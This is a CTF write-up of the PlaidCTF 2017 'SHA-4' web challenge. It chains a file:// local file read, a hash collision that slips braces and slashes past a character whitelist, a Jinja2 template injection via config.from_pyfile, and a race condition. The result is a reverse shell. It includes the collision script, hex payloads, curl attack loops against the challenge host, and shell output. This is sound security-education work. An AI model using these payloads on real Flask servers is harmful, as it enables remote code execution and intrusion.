---
layout: post
title: "PlaidCTF 2017 - SHA-4"
category: writeups
authors: [thezero, jbz]
tags: plaidctf-2017 web
---

## SHA-4
Web - 300 Points


### Writeup

This challenge provided two forms, one which allowed to upload fomments and a textarea which would parse an hex encoded, ans1 enveloped input.

Solution *tl;dr*

    local file read, hash collision, template injection, race condition


#### Directory Traversal

It is trivial to find a directory traversal by using the `file://` uri scheme instead of the intended `http://` or `https://` ones. Once We got file-reading access, by getting the system version from `file:///etc/issue` and getting the cmdline from `file:///proc/self/cmdline` we found the directory of the python webapp: `/var/www/sha4`.

By guessing we found out that the directory contained those 2 files:
[server.py]({{ site.url }}/assets/PlaidCTF2017/sha4_server.py)
[sha4.py]({{ site.url }}/assets/PlaidCTF2017/sha4_sha4.py)

By checking the code we can see a possible template injection here:

    return render_template_string(commentt, comment=out_text.replace("\n","<br/>"))

However we can't directly send an input containing characters such as `{}` or `/` because the function `is_unsafe()` check if our comments contains chars not whitelisted in `string.ascii_letters + string.digits + " ,.:()?!-_'+=[]\t\n<>"` before rendering it.

The code however seems a little strange for what it is intended to do, let's check the whole `comments()` function:

{% highlight python %}
try:
  encoded = request.form['comment']
  encoded.replace("\n","\r")
  ber = encoded.decode("hex")
except TypeError:
  return render_template_string(bad)
f = "/var/tmp/comments/%s.txt"%hash(ber).encode("hex")
  
out_text = str(decode(ber))
open(f, "w").write(out_text)

if is_unsafe(out_text):
  return render_template_string(unsafe)

commentt = comment % open(f).read()
return render_template_string(commentt, comment=out_text.replace("\n","<br/>"))
{% endhighlight %}

So the code does the following:

 - hex decode the comment POST parameter
 - calculate the 'sha4' hash of the input
 - set the path `/var/tmp/comments/<hash>.file` as output
 - asn1 ber decode the input
 - write the decoded input to the file
 - check if it contain unsafe characters
 - if the previous check is false render the template

#### Template Injection

Since the webapp use Flask, so we can grab the code needed from [Exploring SSTI in flask](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/) which hash the following requirements to achieve Command Execution:

 - upload a python reverse shell payload
 - inject `{% raw  %}{{ config.from_pyfile('/var/tmp/comments/<hash>.file') }}{% endraw  %}` in the render_template function

Uploading is simple, we just need to upload the file using the upload form and calculate its path with the `sha4` function.  
The second point is the hard one.  
If we take a closer look at the `comments()` function we can notice there's something a little unusual: why would the programmer write the input to disk, check if it's safe and read it back? It is already in the `out_text` variable!

This seem coded to create a race condition situation and make the challenge solvable.
So basically, to exploit the template injection we need to:

 - find a `sha4` hash collision between two asn1 encoded strings: one containing `{% raw  %}{{ config.from_pyfile('/var/tmp/comments/<hash>.file') }}{% endraw  %}` and a safe one (which means without `{}` and `/`)
 - send both requests as fast as we can to have enough luck to exploit the race condition by overwriting the file `/var/tmp/comments/<collided hash>.txt` with the malicious payload while the script has passed the is_unsafe() check on the safe payload


#### Collision!

We find out that finding a collision was pretty easy.
For every char there was a colliding one for each position in the DES key (see sha4.py file).

So we calculate each colliding char in each position for out 3 forbidden char (`{}/`) with this small snippet

{% highlight python %}
def char_position_collision(char):
    for j in xrange(7):
        m1 = "a"*j + char
        for i in xrange(0,256):
            m2 = "a"*j+chr(i)
            if m1 != m2 and hash(m1) == hash(m2):
                print(m1,m2)
                break
char_position_collision("{")
char_position_collision("}")
char_position_collision("/")
{% endhighlight %}

Then we wrote this [script]({{ site.url }}/assets/PlaidCTF2017/sha4_find_payload.py) that:

 1. take our "bad" payload, for each "bad" character replace it with it's relative collision
 2. set dummy padding at the start and at the end of the payload, since the hash function was appending a padding block that needs to collide as well. 
 3. encode both "good" and "bad" payload as ASN.1
 4. hash them!

Here the 2 payload, ASN.1 encoded
```
0459617b7b636f6e6669672e66726f6d5f707966696c652820222e2e2f2e2e2f746d702f636f6d6d656e74732f64643331623464633435346336656337653031343736653032663865656163342e66696c652229207d7d61616161
0459616b73636f6e6669672e66726f6d5f707966696c652820222e2e2e2e2e3f746d702e636f6d6d656e74730f64643331623464633435346336656337653031343736653032663865656163342e66696c652229203d5d61616161
```

#### Finally, the Flag

Once we have the colliding payloads we just have to send both requests, as fast as we can, possibly using multiple threads; so from a server with a fast connection we can simply open multiple tmux sessions, running one of the following command is each
{% highlight shell %}
while true; do curl --data 'comment=0459616b73636f6e6669672e66726f6d5f707966696c652820222e2e2e2e2e3f746d702e636f6d6d656e74730f64643331623464633435346336656337653031343736653032663865656163342e66696c652229203d5d61616161' http://sha4.chal.pwning.xxx/comments; done;
{% endhighlight %}
{% highlight shell %}
while true; do curl --data 'comment=0459617b7b636f6e6669672e66726f6d5f707966696c652820222e2e2f2e2e2f746d702f636f6d6d656e74732f64643331623464633435346336656337653031343736653032663865656163342e66696c652229207d7d61616161' http://sha4.chal.pwning.xxx/comments; done;
{% endhighlight %}

After a while the reverse shell should call back to our netcat listener:  

{% highlight shell %}
$ whoami
www-data
$ uname -a
Linux chal-sha4 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
$ pwd
/var/www
$ ls
html
sha4
$ ls sha4
flag_bilaabluagbiluariglublaireugrpoop
server.py
server.pyc
sha4.py
sha4.pyc
sha4.wsgi
static
templates
$ cat sha4/flag_bilaabluagbiluariglublaireugrpoop
PCTF{th3 security aspect of cyber is very very tough}
{% endhighlight %}

